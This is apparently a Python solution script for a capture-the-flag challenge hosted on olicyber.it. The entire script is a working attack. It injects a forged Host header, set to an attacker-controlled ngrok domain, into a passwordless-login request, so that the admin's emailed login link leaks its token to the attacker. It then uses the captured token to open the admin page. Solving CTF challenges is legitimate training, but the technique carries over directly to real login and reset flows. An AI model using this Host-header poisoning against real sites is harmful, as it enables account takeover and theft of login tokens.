import requests, flask

url = 'http://not-phishing.challs.olicyber.it:38100/'

host = input('ngrok host: ') # example: 10b8-93-44-124-154.ngrok-free.app

# Make server send a link to my service to the admin using ngrok, so the admin clicks on it and sends the token to me
headers = {
    'Host':  host, # $_SERVER['HTTP_HOST']
    'Content-Type': 'application/x-www-form-urlencoded',
}

requests.post(url + 'passwordless_login.php', headers=headers, data={'email':'admin@fakemail.olicyber.it'})
print('request sent, get the token from the server')

# Login with the token
token = input('token: ')
s = requests.Session()

s.get(url + 'token_login.php', params={'token': token})
print(s.get(url + 'admin.php').text)